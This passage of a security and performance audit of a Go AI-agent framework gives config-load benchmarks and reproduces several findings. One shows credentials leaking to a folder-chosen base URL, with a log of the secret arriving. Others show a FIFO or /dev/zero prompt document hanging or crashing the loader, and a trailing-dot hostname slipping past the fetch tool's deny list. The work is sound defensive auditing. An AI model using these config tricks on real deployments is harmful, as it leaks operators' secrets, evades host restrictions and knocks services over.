| PH2 | `BenchmarkP2APH2AgentsDir`: `agents_dir` with 0 / 30 / 100 agent folders (agent.json + prompt.md), then 5 folders × 100 agents (distinct names and the same names with `agents_dir_override`), then 5 agents × 2 × 1 MiB prompt documents | 0 folders **0.25 ms** (85 KiB); 30 **1.17 ms** (295 KiB, 3240 allocs); 100 **3.32 ms** (803 KiB, 8506); 5×100 distinct **16.40 ms** (3.68 MiB, 38 651); 5×100 same+override **15.81 ms** (3.30 MiB, 38 641); 10 MiB of documents **6.09 ms** (30 MiB allocated) | **30.7 µs per agent folder**; `strace -f -c` on 10 loads of 100 folders: **3.90 `openat`, 3.90 `newfstatat`, 6.60 `read`, 3.90 `close` per folder** (44 syscalls per folder including runtime noise) | **confirmed for the reader half; not confirmed for the O(agents²) half** |
| PH3 | `BenchmarkP2APH3ExternalFiles`: `env_file` absent / 1 KiB / 1 MiB for `bash`, and 1 KiB / 1 MiB for `bash`+`exec`+`process`; then 2 × 1 MiB and 2 × 10 MiB of agent prompt documents | none **215 µs**; bash 1 KiB **271**; bash 1 MiB **35.9 ms** (17.3 MiB, 76 463 allocs); 3 tools 1 KiB **427**; 3 tools 1 MiB **103.7 ms** (51.4 MiB, 227 658); documents 2 MiB **1.53 ms**, 20 MiB **8.75 ms** (61.6 MiB allocated, 12 % noisy) | 1 MiB of `env_file` costs **35.9 ms** and is paid **once per tool that names it** (3 tools = 2.89×); documents are **~0.44 ms per MiB read** with **3× the bytes allocated** | **confirmed on both halves** |
| PH3 (attribution) | `BenchmarkP2APH3EnvParse`: `parseNativeBashEnvFile` on the same bytes | 1 KiB **25.8 µs** (40.8 MB/s); 1 MiB **28.1 ms** (37.4 MB/s, 9.7 MiB, 75 194 allocs) | the **parse**, not the read, is 28.1 of the 35.9 ms | **confirmed** |
| PH4 | `BenchmarkP2APH4MemoryStateContext`: one minimal selector vs 128 selectors × 1 key vs 128 selectors × 8 filter keys at depth 8 | minimal **231 µs**; 128×1 **2.20 ms** (904 KiB, 5668 allocs); 128×8 depth 8 **6.87 ms** (4.24 MiB, 10 082) | **17.2 µs per selector** with one key, **53.7 µs** with eight at depth 8; the worst case is **30× a minimal load** | **confirmed** |
| PH5 | `BenchmarkP2APH5ExecRunners`: 0 / 1 / 20 configured `exec` runners, each with two aliases | 0 **221 µs**; 1 **259**; 20 **684 µs** (259 KiB, 2147 allocs) | +21 µs per runner, of which **8.2 µs** is the language table (`BenchmarkP2APH5ExecLangs`: 3.52 / 11.98 / **168.05 µs**, spread 7.8 % at 20) | **confirmed as a cost, not confirmed that the alias map is the cost** |

**PH1 arithmetic.** The load decodes the shared `tools` object **21 times** and `tools.native` **22 times** per load (`grep -c 'decodeConfigObject(toolsRaw'` and `…(nativeRaw'` over the non-test files: 21 and 22 sites; the merge's "18 × 2" was the section count, not the call count). At 20 sections that is 21 × 3.07 = 64.5 µs + 22 × 8.67 = 190.7 µs + ~16 µs of section-object key scans = **271 µs of the 577 µs load (47 %)**; at 1 section it is 21 × 1.16 + 22 × 0.83 + 0.78 = **43 µs of 209 µs (21 %)**. So the repeated decode explains 228 of the 368 µs the 20 sections add (62 %); the rest is the sections' own validation and defaults, which is legitimate work.

### 12.3 What the measurement corrected

- **PH1's call count**: 21 + 22 decodes per load at this HEAD, not "18 × 2" — the repeated decode is a little worse than filed and it is the largest single fixed cost of the phase. It also explains why `LoadSessionConfig` (+15 µs) is cheap next to it.
- **PH2's O(agents²) half is refuted.** 5 folders × 100 agents with *the same* names and `agents_dir_override` cost 15.81 ms against 16.40 ms for distinct names — the replacement scan is invisible; `withSubagentOverrides` is O(folders × agents × agents) over an in-memory slice, and at 500 agents it is under the noise of 500 folder reads. The cost is the **reader**: 30.7 µs and ~18 syscalls per folder, with `agent.json` opened twice (see P2A-18) — `strace` shows 3.9 `openat` and 3.9 `newfstatat` per folder.
- **PH3's split**: the unbounded `env_file` is expensive because of the **line-by-line regex parse at ~37 MB/s**, not the read. 1 MiB therefore costs 35.9 ms per load and 103.7 ms when three tools name the same file — a config of that size is a load-time foot-gun on top of P2A-03's missing regular-file/size check. The documents half is linear and cheap in time (0.44 ms/MiB) but allocates 3× its bytes (61.6 MiB for 20 MiB), which is the real cost of the missing cap.
- **PH4 is bigger than the merge expected** ("likely negligible"): a 128-selector, 8-key, depth-8 `memory.statecontext` costs 6.87 ms per load, 30× a minimal load and 4.24 MiB of allocation. It is still a configuration-size question (the defaults have no selectors), but it is not negligible at the schema's maximum.
- **PH5 is real but small**: 20 runners add 424 µs per load; only 168 µs of that is the language table and its `claimed` map. Worth noting separately: **there is no cap on the number of `exec` runners** (`native_exec_settings.go` bounds `argv` at 32 but not the runner count), so the cost is unbounded in the config while the alias table stays quadratic in labels.
- **New observation, no finding filed**: none of PH1-PH5 changes a rating. The two numbers that are large enough to matter at scale (PH3's 35.9 ms/MiB and PH4's 6.87 ms) both come from configuration sizes nobody sane writes, and P2A-03's cap bounds PH3 anyway.

Verdicts: **confirmed 4** (PH1, PH2's reader half, PH3, PH4), **partly confirmed 2** (PH2's override half refuted; PH5 confirmed as a cost with a corrected attribution). Nothing was "not confirmed" outright.

### 12.4 The three flagged reproductions

All three ran in the byte-identical copy; nothing was left behind in the repository.

**P2A-02 — the last hop, executed (was "read, not executed")**

`TestP2AReproAgentFolderModelExfil` (`internal/app`, scratch) builds a real catalog-layout session whose toolset points `agents_dir` at a folder holding `agent.json` = `{"description": …, "model": "m.json"}` and a sibling `m.json` = `{"provider":"openai","model":"gpt-test","api_key_env":"P2A_LEAKED","base_url":<httptest URL>}`; it then runs the real chain `LoadSessionSettings` → `subagentLauncher.childConfig` (→ `WithModel` on the folder-anchored path) → `Resolver.providerAPIKey` → `Resolver.newProviderStreamer` → `Client.Stream` against an `httptest` server. Exit 0, and the log is the whole finding:

```
agent "helper" model path ".../agents/helper/m.json" (resolveFrom the folder, not a catalog id)
child model: provider=openai name=gpt-test api_key_env=P2A_LEAKED base_url=http://127.0.0.1:40115
providerAPIKey read the server's own environment: "s3cret-from-the-server-environment"
stream error (expected for 401): read OpenAI Responses stream: OpenAI API error: 401 Unauthorized {"message":"no"}
SERVER SAW: POST /responses authorization=Bearer s3cret-from-the-server-environment
```

So an agent folder names a **file**, that file names **any variable of the server's environment** and **any base URL**, and the child's first provider request carries that variable to that URL — reproduced end to end, no reading left. The one difference from a live child run is that the request was issued by the same client the launcher builds, not by a full `session.Runner`; the launcher's remaining work (store, tools, prompt) does not touch the credential. **Recommendation: raise P2A-02 from medium to high** (§11 decision 1) — it is a complete, one-file exfiltration path that needs no tool call from the model.

**P2A-03 — the FIFO and `/dev/zero` half, executed (was "r1's measurements, not re-run")**

| probe | command | result |
|---|---|---|
| FIFO as `prompt_documents` entry | `timeout 6 ./sessionfs.test -test.run '^TestP2A03FIFOPromptDocument$'` | **exit 124 after 6.0 s** — the load blocked in `os.ReadFile` on the FIFO and never returned; no timeout, no regular-file check |
| `/dev/zero` as `prompt_documents` entry, 3 GiB address-space cap | `timeout 60 prlimit --as=3000000000 /usr/bin/time -f … ./sessionfs.test -test.run '^TestP2A03DevZeroPromptDocument$'` | **exit 2 after 0.17 s, maxrss 439 MB**: `runtime: out of memory: cannot allocate 301989888-byte block (498466816 in use)` / `fatal error: out of memory` |
| same, 8 GiB cap (to show the growth rate) | `… prlimit --as=8000000000 …` | **exit 2 after 1.38 s, maxrss 3 169 924 kB (3.17 GB)**, `cannot allocate 2243952640-byte block (4805984256 in use)` — the read buffer doubles, so ~2.3 GB/s until the process dies |
| control: the same document as a regular file | `go test -run '^TestP2A03ControlRegularDocument$'` | pass, `agents=1` |

The caps are mine (`prlimit`), not the code's: without them the process grows until the host OOM killer or the runtime gives up. Both halves of P2A-03 are now reproduced, not inherited from r1.

**P2A-09 / P2A-10 — whether a request would actually be denied or allowed, executed**

- P2A-09, through the **real fetch tool and the real network** (`TestP2AReproTrailingDotDeny`, settings `denied_hosts: ["example.com"]`): `https://example.com/` → tool result `host_denied` (refused); `https://example.com./` → `status=200`, `Document fetched`. The rooted name resolves to the same addresses (`getent hosts example.com.` and `getent hosts example.com` both return `2606:4700:10::6814:179a`, `2606:4700:10::ac42:93f3`) and the request **went out**. `isPublicFetchAddress` is not bypassed — this is the public-host case the finding describes, now proven end to end rather than argued.
- P2A-10, through the **real loader** (`TestP2A10IPv6HostEntry`): `denied_hosts: ["2001:db8::1"]` and `["::1"]` both fail with `<setting>: tools.native.fetch.denied_hosts must contain host names or IP addresses`; a name entry loads (`denied=[example.com]`). Confirmed at the loader, which is where the finding lives; the consumer side was already reproduced in the merge with the same Go `url.Parse`/`net.ParseIP` calls.

### 12.5 Ratings and status after measurement

| item | status now | basis |
|---|---|---|
| P2A-02 | **confirmed end to end; recommend high** (decision needed) | 12.4: the secret arrived at the folder-chosen URL |
| P2A-03 | **confirmed by reproduction** (both halves); stays medium | 12.4 pytest-table; PH3 adds 35.9 ms/MiB as the load-time cost the cap would also bound |
| P2A-09 | **confirmed end to end**; stays medium | 12.4: denied spelling refused, rooted spelling fetched |
| P2A-10 | **confirmed at the loader**; stays low | 12.4 |
| P2A-01 | unchanged; **not measured here** (its arithmetic was checked in §10, its prune cost belongs to p4 M23) | - |
| PH1 | confirmed; the repeated decode is ~47 % of a 20-section load → the fix that matters if any of this is ever touched | 12.2/12.3 |
| PH2 | confirmed for the folder cost, **override half refuted** | 12.3 |
| PH3 | confirmed; the parse dominates and is per tool | 12.3 |
| PH4 | confirmed; 6.87 ms at the schema maximum, not negligible | 12.3 |
| PH5 | confirmed as a linear cost; the alias map is only 8.2 µs of 21 µs per runner; **no cap on the runner count** (new observation, no finding) | 12.3 |
| §11 decision 10 (measurement go-ahead) | **answered by this section** | - |

No new finding ids were filed: every number above either explains an existing finding (P2A-02, P2A-03, P2A-18's double read, P2A-09) or is a configuration-size cost with no defect attached.

### 12.6 Limits, what was not measured, reproducibility

- **tmpfs only.** PH1-PH5 are CPU/parse/allocation questions; a btrfs run would add fsync noise and change nothing. Anyone re-running PH2/PH3 on a real disk should expect the *reader* half to grow (page-cache misses) and the *parse* half to stay.
- **One machine, not idle** (load 1.0-2.0). Absolute µs values are therefore ±a few percent; every conclusion above rests on a ratio between two sizes measured back to back.
- **The three `/dev/zero` rows carry my `prlimit` caps** (3 and 8 GiB of address space); the growth *rate* (≈2.3 GB/s, doubling buffer) and the fatal-error outcome are the measured facts, the caps are not part of the code.
- **P2A-02 stops at the request.** No real provider, no full `session.Runner`, no child transcript; the credential path is complete, the child's model round trip is not exercised.
- **Not measured**: PH5's extrapolation past 20 runners (no cap exists, so it is linear by construction), P2A-01's prune on a real store (p4 M23's job), PH2 with a very large `agents_dir` on a cold page cache, and any `-bench` row under `-race`.
- **The `-race` pass covers the package suite only** (12.1), which is what §9 asked for; the benchmarks ran without it.
- Reproducibility: the fixture writer, the ten benchmark files and the three repro tests are listed in 12.1 and were removed with `/tmp/p2am`; they are four small files to re-create for the fix step, and every one of them builds only on exported-or-package-local symbols of the packages under test.
